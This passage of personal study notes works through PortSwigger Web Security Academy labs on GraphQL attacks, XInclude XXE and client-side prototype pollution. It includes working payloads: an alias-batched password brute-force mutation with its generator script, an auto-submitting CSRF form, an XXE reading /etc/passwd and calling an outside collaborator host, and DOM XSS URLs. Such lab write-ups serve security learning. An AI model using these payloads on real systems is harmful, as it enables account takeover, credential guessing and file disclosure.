            [https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql)
            
        - after exploring the app, we find the graphql endpoint in burp history
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20557.png)
            
        - Notice that that the blog posts in the response are assigned a sequential id and that the blog post with the id 3 is missing
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20558.png)
            
        - Next, we feed that URL to GraphQL scanner to do introspection query for us and display the results
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20559.png)
            
        - Notice that the `getBlogPost` query contains a field called `postPassword`
        - So, we used the query `getBlogPost` to get the content of the blog post with id 3 and specifically the field  `postPassword`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20560.png)
            
        - FYI, the other blog posts had a null value in that field
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20561.png)
            
    - Accidental exposure of private GraphQL fields
        - lab link
            
            [https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
            
        - like the previous lab, we get the GraphQL API’s endpoint, and feed it to InQL scanner
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20562.png)
            
        - Then, we use the query `getUser` to get administrator’s credentials
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20563.png)
            
        - we login using this creds, delete carlos, and solve the lab
        
    - Finding a hidden GraphQL endpoint
        - lab link
            
            [https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
            
        - we don’t find the GraphQL endpoin in burp history
        - Reminder : few tips from the course
            
            GraphQL services often use similar endpoint suffixes. When testing for GraphQL endpoints, you should look to send universal queries to the following locations:
            
            - `/graphql`
            - `/api`
            - `/api/graphql`
            - `/graphql/api`
            - `/graphql/graphql`
            
            If these common endpoints don't return a GraphQL response, you could also try appending `/v1` to the path.
            
            GET requests use a content-type of `x-www-form-urlencoded`.
            
            - Introspection query with newline
                - json
                    
                    ```ruby
                    {
                            "query": "query{__schema
                            {queryType{name}}}"
                        }
                    ```
                    
                - url-encoded
                    
                    ```ruby
                    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
                    ```
                    
            
            When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.
            
        - after trying some common GraphQL endpoints, we get a response but introspection is not allowed
            
            ```ruby
            https://0ac600210435fd1180c6a8360030009c.web-security-academy.net/api?query=query%7b__schema%2c%7bqueryType%7bname%7d%7d%7d
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20564.png)
            
        - so we use a new line after `__schema` to bypass this restriction
            
            ```ruby
            GET /api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20565.png)
            
        - Now we use the new line with the Full introspection query
            - query with new line after `__schema`
                
                ```ruby
                query IntrospectionQuery {
                  __schema
                 {
                    queryType {
                      name
                    }
                    mutationType {
                      name
                    }
                    subscriptionType {
                      name
                    }
                    types {
                      ...FullType
                    }
                    directives {
                      name
                      description
                      args {
                        ...InputValue
                      }
                    }
                  }
                }
                
                fragment FullType on __Type {
                  kind
                  name
                  description
                  fields(includeDeprecated: true) {
                    name
                    description
                    args {
                      ...InputValue
                    }
                    type {
                      ...TypeRef
                    }
                    isDeprecated
                    deprecationReason
                  }
                  inputFields {
                    ...InputValue
                  }
                  interfaces {
                    ...TypeRef
                  }
                  enumValues(includeDeprecated: true) {
                    name
                    description
                    isDeprecated
                    deprecationReason
                  }
                  possibleTypes {
                    ...TypeRef
                  }
                }
                
                fragment InputValue on __InputValue {
                  name
                  description
                  type {
                    ...TypeRef
                  }
                  defaultValue
                }
                
                fragment TypeRef on __Type {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
                ```
                
            - url-encoded query
                
                ```ruby
                https://0ac600210435fd1180c6a8360030009c.web-security-academy.net/api?query=%71%75%65%72%79%20%49%6e%74%72%6f%73%70%65%63%74%69%6f%6e%51%75%65%72%79%20%7b%0a%20%20%5f%5f%73%63%68%65%6d%61%0a%20%7b%0a%20%20%20%20%71%75%65%72%79%54%79%70%65%20%7b%0a%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%7d%0a%20%20%20%20%6d%75%74%61%74%69%6f%6e%54%79%70%65%20%7b%0a%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%7d%0a%20%20%20%20%73%75%62%73%63%72%69%70%74%69%6f%6e%54%79%70%65%20%7b%0a%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%7d%0a%20%20%20%20%74%79%70%65%73%20%7b%0a%20%20%20%20%20%20%2e%2e%2e%46%75%6c%6c%54%79%70%65%0a%20%20%20%20%7d%0a%20%20%20%20%64%69%72%65%63%74%69%76%65%73%20%7b%0a%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%20%20%64%65%73%63%72%69%70%74%69%6f%6e%0a%20%20%20%20%20%20%61%72%67%73%20%7b%0a%20%20%20%20%20%20%20%20%2e%2e%2e%49%6e%70%75%74%56%61%6c%75%65%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%20%20%7d%0a%7d%0a%0a%66%72%61%67%6d%65%6e%74%20%46%75%6c%6c%54%79%70%65%20%6f%6e%20%5f%5f%54%79%70%65%20%7b%0a%20%20%6b%69%6e%64%0a%20%20%6e%61%6d%65%0a%20%20%64%65%73%63%72%69%70%74%69%6f%6e%0a%20%20%66%69%65%6c%64%73%28%69%6e%63%6c%75%64%65%44%65%70%72%65%63%61%74%65%64%3a%20%74%72%75%65%29%20%7b%0a%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%64%65%73%63%72%69%70%74%69%6f%6e%0a%20%20%20%20%61%72%67%73%20%7b%0a%20%20%20%20%20%20%2e%2e%2e%49%6e%70%75%74%56%61%6c%75%65%0a%20%20%20%20%7d%0a%20%20%20%20%74%79%70%65%20%7b%0a%20%20%20%20%20%20%2e%2e%2e%54%79%70%65%52%65%66%0a%20%20%20%20%7d%0a%20%20%20%20%69%73%44%65%70%72%65%63%61%74%65%64%0a%20%20%20%20%64%65%70%72%65%63%61%74%69%6f%6e%52%65%61%73%6f%6e%0a%20%20%7d%0a%20%20%69%6e%70%75%74%46%69%65%6c%64%73%20%7b%0a%20%20%20%20%2e%2e%2e%49%6e%70%75%74%56%61%6c%75%65%0a%20%20%7d%0a%20%20%69%6e%74%65%72%66%61%63%65%73%20%7b%0a%20%20%20%20%2e%2e%2e%54%79%70%65%52%65%66%0a%20%20%7d%0a%20%20%65%6e%75%6d%56%61%6c%75%65%73%28%69%6e%63%6c%75%64%65%44%65%70%72%65%63%61%74%65%64%3a%20%74%72%75%65%29%20%7b%0a%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%64%65%73%63%72%69%70%74%69%6f%6e%0a%20%20%20%20%69%73%44%65%70%72%65%63%61%74%65%64%0a%20%20%20%20%64%65%70%72%65%63%61%74%69%6f%6e%52%65%61%73%6f%6e%0a%20%20%7d%0a%20%20%70%6f%73%73%69%62%6c%65%54%79%70%65%73%20%7b%0a%20%20%20%20%2e%2e%2e%54%79%70%65%52%65%66%0a%20%20%7d%0a%7d%0a%0a%66%72%61%67%6d%65%6e%74%20%49%6e%70%75%74%56%61%6c%75%65%20%6f%6e%20%5f%5f%49%6e%70%75%74%56%61%6c%75%65%20%7b%0a%20%20%6e%61%6d%65%0a%20%20%64%65%73%63%72%69%70%74%69%6f%6e%0a%20%20%74%79%70%65%20%7b%0a%20%20%20%20%2e%2e%2e%54%79%70%65%52%65%66%0a%20%20%7d%0a%20%20%64%65%66%61%75%6c%74%56%61%6c%75%65%0a%7d%0a%0a%66%72%61%67%6d%65%6e%74%20%54%79%70%65%52%65%66%20%6f%6e%20%5f%5f%54%79%70%65%20%7b%0a%20%20%6b%69%6e%64%0a%20%20%6e%61%6d%65%0a%20%20%6f%66%54%79%70%65%20%7b%0a%20%20%20%20%6b%69%6e%64%0a%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%6f%66%54%79%70%65%20%7b%0a%20%20%20%20%20%20%6b%69%6e%64%0a%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%20%20%6f%66%54%79%70%65%20%7b%0a%20%20%20%20%20%20%20%20%6b%69%6e%64%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%0a%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%20%20%7d%0a%7d%0a
                ```
                
            - Use Decoder to url-encode and not inspector !!
        - This enable us to do introspection
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20566.png)
            
        - we save the output in a json file and feed it to InQL Scanner
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20567.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20568.png)
            
        - we find the id of carlos using the query, and delete him using the mutation to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20569.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20570.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20571.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20572.png)
            
    - Bypassing GraphQL brute force protections
        - lab link
            
            [https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
            
        - we can see the api endpoint in burp history and we feed it to InQL scanner
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20573.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20574.png)
            
        - we will use the login mutation to bruteforce the credentials of the user Carlos
        - notice that we should keep the used  operation name and it should be the same as the query/mutation name
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20575.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20576.png)
            
        - Next, using a python script i generate a lot of login mutations with different aliases
            - python script ( you should feed it the word list mentioned in the description)
                
                ```python
                def replace_word_in_text(word, text):
                    return text.replace("code", word)
                
                def process_text_with_wordlist(wordlist_file, text, output_file):
                    with open(wordlist_file, 'r') as wordlist:
                        with open(output_file, 'w') as file:
                            for word in wordlist:
                                word = word.strip()  # Remove leading/trailing whitespace
                                modified_text = replace_word_in_text(word, text)
                                file.write(modified_text + '\n')
                
                # Example usage
                wordlist_file = "wordlist.txt"
                text = 'attemptcode:login(input:{password: \"code\", username: \"carlos\"}) {\r\n\t\ttoken\r\n\t\tsuccess\r\n\t}'
                output_file = "output.txt"
                
                process_text_with_wordlist(wordlist_file, text, output_file)
                ```
                
            - Notice how i used a subset of the json query  (not the graphql query ) in the text to replace part
            - screenshot of output
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20577.png)
                
        - We sent the mutation to perform the bruteforce and find carlos’s password
            - graphql query sent
                
                ```python
                mutation getBlogPost {
                	
                attempt123456:login(input:{password: "123456", username: "carlos"}) {
                		token
                		success
                	}
                attemptpassword:login(input:{password: "password", username: "carlos"}) {
                		token
                		success
                	}
                attempt12345678:login(input:{password: "12345678", username: "carlos"}) {
                		token
                		success
                	}
                attemptqwerty:login(input:{password: "qwerty", username: "carlos"}) {
                		token
                		success
                	}
                attempt123456789:login(input:{password: "123456789", username: "carlos"}) {
                		token
                		success
                	}
                attempt12345:login(input:{password: "12345", username: "carlos"}) {
                		token
                		success
                	}
                attempt1234:login(input:{password: "1234", username: "carlos"}) {
                		token
                		success
                	}
                attempt111111:login(input:{password: "111111", username: "carlos"}) {
                		token
                		success
                	}
                attempt1234567:login(input:{password: "1234567", username: "carlos"}) {
                		token
                		success
                	}
                attemptdragon:login(input:{password: "dragon", username: "carlos"}) {
                		token
                		success
                	}
                attempt123123:login(input:{password: "123123", username: "carlos"}) {
                		token
                		success
                	}
                attemptbaseball:login(input:{password: "baseball", username: "carlos"}) {
                		token
                		success
                	}
                attemptabc123:login(input:{password: "abc123", username: "carlos"}) {
                		token
                		success
                	}
                attemptfootball:login(input:{password: "football", username: "carlos"}) {
                		token
                		success
                	}
                attemptmonkey:login(input:{password: "monkey", username: "carlos"}) {
                		token
                		success
                	}
                attemptletmein:login(input:{password: "letmein", username: "carlos"}) {
                		token
                		success
                	}
                attemptshadow:login(input:{password: "shadow", username: "carlos"}) {
                		token
                		success
                	}
                attemptmaster:login(input:{password: "master", username: "carlos"}) {
                		token
                		success
                	}
                attempt666666:login(input:{password: "666666", username: "carlos"}) {
                		token
                		success
                	}
                attemptqwertyuiop:login(input:{password: "qwertyuiop", username: "carlos"}) {
                		token
                		success
                	}
                attempt123321:login(input:{password: "123321", username: "carlos"}) {
                		token
                		success
                	}
                attemptmustang:login(input:{password: "mustang", username: "carlos"}) {
                		token
                		success
                	}
                attempt1234567890:login(input:{password: "1234567890", username: "carlos"}) {
                		token
                		success
                	}
                attemptmichael:login(input:{password: "michael", username: "carlos"}) {
                		token
                		success
                	}
                attempt654321:login(input:{password: "654321", username: "carlos"}) {
                		token
                		success
                	}
                attemptsuperman:login(input:{password: "superman", username: "carlos"}) {
                		token
                		success
                	}
                attempt1qaz2wsx:login(input:{password: "1qaz2wsx", username: "carlos"}) {
                		token
                		success
                	}
                attempt7777777:login(input:{password: "7777777", username: "carlos"}) {
                		token
                		success
                	}
                attempt121212:login(input:{password: "121212", username: "carlos"}) {
                		token
                		success
                	}
                attempt000000:login(input:{password: "000000", username: "carlos"}) {
                		token
                		success
                	}
                attemptqazwsx:login(input:{password: "qazwsx", username: "carlos"}) {
                		token
                		success
                	}
                attempt123qwe:login(input:{password: "123qwe", username: "carlos"}) {
                		token
                		success
                	}
                attemptkiller:login(input:{password: "killer", username: "carlos"}) {
                		token
                		success
                	}
                attempttrustno1:login(input:{password: "trustno1", username: "carlos"}) {
                		token
                		success
                	}
                attemptjordan:login(input:{password: "jordan", username: "carlos"}) {
                		token
                		success
                	}
                attemptjennifer:login(input:{password: "jennifer", username: "carlos"}) {
                		token
                		success
                	}
                attemptzxcvbnm:login(input:{password: "zxcvbnm", username: "carlos"}) {
                		token
                		success
                	}
                attemptasdfgh:login(input:{password: "asdfgh", username: "carlos"}) {
                		token
                		success
                	}
                attempthunter:login(input:{password: "hunter", username: "carlos"}) {
                		token
                		success
                	}
                attemptbuster:login(input:{password: "buster", username: "carlos"}) {
                		token
                		success
                	}
                attemptsoccer:login(input:{password: "soccer", username: "carlos"}) {
                		token
                		success
                	}
                attemptharley:login(input:{password: "harley", username: "carlos"}) {
                		token
                		success
                	}
                attemptbatman:login(input:{password: "batman", username: "carlos"}) {
                		token
                		success
                	}
                attemptandrew:login(input:{password: "andrew", username: "carlos"}) {
                		token
                		success
                	}
                attempttigger:login(input:{password: "tigger", username: "carlos"}) {
                		token
                		success
                	}
                attemptsunshine:login(input:{password: "sunshine", username: "carlos"}) {
                		token
                		success
                	}
                attemptiloveyou:login(input:{password: "iloveyou", username: "carlos"}) {
                		token
                		success
                	}
                attempt2000:login(input:{password: "2000", username: "carlos"}) {
                		token
                		success
                	}
                attemptcharlie:login(input:{password: "charlie", username: "carlos"}) {
                		token
                		success
                	}
                attemptrobert:login(input:{password: "robert", username: "carlos"}) {
                		token
                		success
                	}
                attemptthomas:login(input:{password: "thomas", username: "carlos"}) {
                		token
                		success
                	}
                attempthockey:login(input:{password: "hockey", username: "carlos"}) {
                		token
                		success
                	}
                attemptranger:login(input:{password: "ranger", username: "carlos"}) {
                		token
                		success
                	}
                attemptdaniel:login(input:{password: "daniel", username: "carlos"}) {
                		token
                		success
                	}
                attemptstarwars:login(input:{password: "starwars", username: "carlos"}) {
                		token
                		success
                	}
                attemptklaster:login(input:{password: "klaster", username: "carlos"}) {
                		token
                		success
                	}
                attempt112233:login(input:{password: "112233", username: "carlos"}) {
                		token
                		success
                	}
                attemptgeorge:login(input:{password: "george", username: "carlos"}) {
                		token
                		success
                	}
                attemptcomputer:login(input:{password: "computer", username: "carlos"}) {
                		token
                		success
                	}
                attemptmichelle:login(input:{password: "michelle", username: "carlos"}) {
                		token
                		success
                	}
                attemptjessica:login(input:{password: "jessica", username: "carlos"}) {
                		token
                		success
                	}
                attemptpepper:login(input:{password: "pepper", username: "carlos"}) {
                		token
                		success
                	}
                attempt1111:login(input:{password: "1111", username: "carlos"}) {
                		token
                		success
                	}
                attemptzxcvbn:login(input:{password: "zxcvbn", username: "carlos"}) {
                		token
                		success
                	}
                attempt555555:login(input:{password: "555555", username: "carlos"}) {
                		token
                		success
                	}
                attempt11111111:login(input:{password: "11111111", username: "carlos"}) {
                		token
                		success
                	}
                attempt131313:login(input:{password: "131313", username: "carlos"}) {
                		token
                		success
                	}
                attemptfreedom:login(input:{password: "freedom", username: "carlos"}) {
                		token
                		success
                	}
                attempt777777:login(input:{password: "777777", username: "carlos"}) {
                		token
                		success
                	}
                attemptpass:login(input:{password: "pass", username: "carlos"}) {
                		token
                		success
                	}
                attemptmaggie:login(input:{password: "maggie", username: "carlos"}) {
                		token
                		success
                	}
                attempt159753:login(input:{password: "159753", username: "carlos"}) {
                		token
                		success
                	}
                attemptaaaaaa:login(input:{password: "aaaaaa", username: "carlos"}) {
                		token
                		success
                	}
                attemptginger:login(input:{password: "ginger", username: "carlos"}) {
                		token
                		success
                	}
                attemptprincess:login(input:{password: "princess", username: "carlos"}) {
                		token
                		success
                	}
                attemptjoshua:login(input:{password: "joshua", username: "carlos"}) {
                		token
                		success
                	}
                attemptcheese:login(input:{password: "cheese", username: "carlos"}) {
                		token
                		success
                	}
                attemptamanda:login(input:{password: "amanda", username: "carlos"}) {
                		token
                		success
                	}
                attemptsummer:login(input:{password: "summer", username: "carlos"}) {
                		token
                		success
                	}
                attemptlove:login(input:{password: "love", username: "carlos"}) {
                		token
                		success
                	}
                attemptashley:login(input:{password: "ashley", username: "carlos"}) {
                		token
                		success
                	}
                attemptnicole:login(input:{password: "nicole", username: "carlos"}) {
                		token
                		success
                	}
                attemptchelsea:login(input:{password: "chelsea", username: "carlos"}) {
                		token
                		success
                	}
                attemptbiteme:login(input:{password: "biteme", username: "carlos"}) {
                		token
                		success
                	}
                attemptmatthew:login(input:{password: "matthew", username: "carlos"}) {
                		token
                		success
                	}
                attemptaccess:login(input:{password: "access", username: "carlos"}) {
                		token
                		success
                	}
                attemptyankees:login(input:{password: "yankees", username: "carlos"}) {
                		token
                		success
                	}
                attempt987654321:login(input:{password: "987654321", username: "carlos"}) {
                		token
                		success
                	}
                attemptdallas:login(input:{password: "dallas", username: "carlos"}) {
                		token
                		success
                	}
                attemptaustin:login(input:{password: "austin", username: "carlos"}) {
                		token
                		success
                	}
                attemptthunder:login(input:{password: "thunder", username: "carlos"}) {
                		token
                		success
                	}
                attempttaylor:login(input:{password: "taylor", username: "carlos"}) {
                		token
                		success
                	}
                attemptmatrix:login(input:{password: "matrix", username: "carlos"}) {
                		token
                		success
                	}
                attemptmobilemail:login(input:{password: "mobilemail", username: "carlos"}) {
                		token
                		success
                	}
                attemptmom:login(input:{password: "mom", username: "carlos"}) {
                		token
                		success
                	}
                attemptmonitor:login(input:{password: "monitor", username: "carlos"}) {
                		token
                		success
                	}
                attemptmonitoring:login(input:{password: "monitoring", username: "carlos"}) {
                		token
                		success
                	}
                attemptmontana:login(input:{password: "montana", username: "carlos"}) {
                		token
                		success
                	}
                attemptmoon:login(input:{password: "moon", username: "carlos"}) {
                		token
                		success
                	}
                attemptmoscow:login(input:{password: "moscow", username: "carlos"}) {
                		token
                		success
                	}
                
                }
                ```
                
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20578.png)
            
        - we login with Carlos and the password found to solve the lab
    - Performing CSRF exploits over GraphQL
        - lab link
            
            [https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
            
        - this the request made in the action “change email”
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20579.png)
            
        - To perform the CSRF attack, we need to change the content type  `x-www-form-urlencoded`
        - This can be done in two ways
            - long way
                - i used InQL Scanner to get API documentation
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20580.png)
                    
                - right click on mutation content ⇒ send to repeater (post body urlencoded)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20581.png)
                    
                - if we fill the email part, and url-encode the content, the changing of the email will work
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20582.png)
                    
            - short/easy way
                
                1. Convert the request into a POST request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select **Change request method** twice.
                
        - right click on request > engagement tools > generate CSRF poc > copy html
            
            ```html
            <html>
              <!-- CSRF PoC - generated by Burp Suite Professional -->
              <body>
              <script>history.pushState('', '', '/')</script>
                <form action="https://0aef004c03c7e4e881608090005100da.web-security-academy.net/graphql/v1" method="POST">
                  <input type="hidden" name="query" value="mutation&#32;&#123;&#10;&#9;changeEmail&#40;input&#58;&#123;email&#58;&#32;&quot;a&#64;a&#46;com&quot;&#125;&#41;&#32;&#123;&#10;&#9;&#9;email&#10;&#9;&#125;&#10;&#125;" />
                  <input type="submit" value="Submit request" />
                </form>
              </body>
            </html>
            ```
            
        - edit the html so that it submits automatically the form
            
            ```html
            <html>
              <!-- CSRF PoC - generated by Burp Suite Professional -->
              <body>
              <script>history.pushState('', '', '/')</script>
                <form action="https://0ab600e0041c4b1081ed4d5300150014.web-security-academy.net/graphql/v1" method="POST">
                  <input type="hidden" name="query" value="mutation&#32;&#123;&#10;&#9;changeEmail&#40;input&#58;&#123;email&#58;&#32;&quot;a&#64;a&#46;com&quot;&#125;&#41;&#32;&#123;&#10;&#9;&#9;email&#10;&#9;&#125;&#10;&#125;" />
                  <input type="submit" value="Submit request" />
                </form>
                <script>
                  document.forms[0].submit();
                </script>
              </body>
            </html>
            ```
            
        - Deliver exploit to victim in order to solve the lab
        
- Essential skills
    - Discovering vulnerabilities quickly with targeted scanning
        - i don’t know why in the beginning i didn’t see the vulnerability appear in burp’s issue activity and i had to retry the lab many times
        - but eventually i get the following issue, which looks like a blind XXE
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20583.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20584.png)
            
        - if we decode the payload used by burp scanner, we find that it uses XInclude
            
            ```html
            <gou xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"><xi:include href="[http://j1l83vue1jcd4zv468ddalqsxj3er6f73zqpee.oastify.com/foo](http://j1l83vue1jcd4zv468ddalqsxj3er6f73zqpee.oastify.com/foo)"/></gou>
            ```
            
        - if we go back to XXE course, we find that we can use Xinclude to retreive files
            - same payload as the course
                
                ```html
                <foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)"><xi:include parse="text" href="file:///etc/passwd"/></foo>
                ```
                
            - burp scanner flagged both http parameters as vulnerable but the attack only worked for `productId` parameter
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20585.png)
            
        
- prototype pollution
    - Client-side vulnerabilities
        - Using Dom invader to automate finding the source and the gadget
            
            [https://portswigger-labs.net/dom-invader-prototype-pollution/](https://portswigger-labs.net/dom-invader-prototype-pollution/)
            
            [https://www.youtube.com/watch?v=GeqVMOUugqY](https://www.youtube.com/watch?v=GeqVMOUugqY)
            
            [https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)
            
            - exploiting the lab in the video solution
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20586.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20587.png)
                
                In the example below, a gadget property called `html` was passed to the `innerHTML` sink.
                
                To exploit it, use the following payload  and notice how i didn’t use `<script>` to adapt my payload to the sink 
                
                ```html
                 [https://portswigger-labs.net/dom-invader-prototype-pollution/testcases/prototype-pollution-query-string-gadget/?__proto__[html]=](https://portswigger-labs.net/dom-invader-prototype-pollution/testcases/prototype-pollution-query-string-gadget/?__proto__%5Bhtml%5D=)<img src onerror='alert()' />
                ```
                
        - DOM XSS via client-side prototype pollution
            - lab link ( check manual solution for better understanding)
                
                [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
                
            - after enabling prototype pollution and accessing the lab with  DOM Invader, we find 2 sources of prototype pollution
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20588.png)
                
            - the first source indicates that we can modify arbitrary properties to prototype objects by using “value in search” which means using http parameters and precisely ?`__proto__|property]=value`
            - we can confirm this using the button Test or manually in the console
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20589.png)
                
            - Next, we click the green button “scan for gadgets”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20590.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20591.png)
                
            - In the screenshot below, a gadget property called `transport_url` was passed to the `innerHTML` sink.
                - when we get the string "prototypepollutiontransport_url" (between the two canarys), this means that the gadget (the property) is `transport_url`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20592.png)
                
            - Knowing the gadget, the source and the sink, we can exploit the vulnerability
                
                the sink is `script.src` so i used the same payload that i saw in the course `data:,alert();//`
                
                - what is the structure of a `data:` URL work ? (chatgpt answer)
                    
                    A data URL, also known as a data URI, is a specific type of Uniform Resource Identifier (URI) that allows data to be embedded directly within a web page or a link. Instead of referring to an external resource through its traditional URL, a data URL encodes the resource's data directly within the URL itself. This can include images, videos, audio files, HTML, CSS, **JavaScript code**, or any other type of data.
                    
                    Data URLs have the following general structure:
                    
                    ```wasm
                    wasmCopy code
                    data:[<MIME-type>][;base64],<data>
                    
                    ```
                    
                    Let's break down the components of a data URL:
                    
                    1. **`data:`**: The scheme, which is always "data".
                    2. **`<MIME-type>`**: The MIME type of the data being embedded. This indicates the type of data being represented, such as "text/plain" for plain text, "image/png" for PNG images, "text/html" for HTML code, etc.
                    3. **`;base64`**: An optional parameter that indicates that the data is base64-encoded. If this parameter is present, it means that the data is not in its raw form but has been encoded using the base64 encoding scheme.
                    4. **`<data>`**: The actual data being embedded. If the data is not base64-encoded, it will be represented as plain text. If it is base64-encoded, it will be a sequence of characters representing the binary data.
                    
                    Here are a few examples of data URLs:
                    
                    1. A plain text data URL:
                        
                        ```vbnet
                        vbnetCopy code
                        data:text/plain;charset=utf-8,Hello%2C%20world!
                        
                        ```
                        
                    2. A base64-encoded PNG image data URL:
                        
                        ```bash
                        bashCopy code
                        data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA... (base64 encoded data here)
                        
                        ```
                        
                    3. An HTML document data URL:
                        
                        ```mathematica
                        mathematicaCopy code
                        data:text/html;charset=utf-8,%3C!DOCTYPE%20html%3E%3Chtml%3E%3Cbody%3E%3Ch1%3EHello%2C%20world!%3C%2Fh1%3E%3C%2Fbody%3E%3C%2Fhtml%3E
                        
                        ```
                        
                    
                    Data URLs are commonly used for embedding small resources directly into HTML documents, especially for images, CSS styles, and JavaScript code. However, they may not be suitable for large files or resources because they can increase the size of the HTML document, leading to slower loading times. They are most effective for small assets or when you want to reduce the number of HTTP requests needed to load a page.
                    
                
                so we end up with the following url : 
                
                ```html
                https://vulnerable_app/?__proto__[transport_url]=data:,alert();//
                ```
                
            - we can also display the code snippet showing the use of the sink function by clicking on “Stack Trace”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20593.png)
                
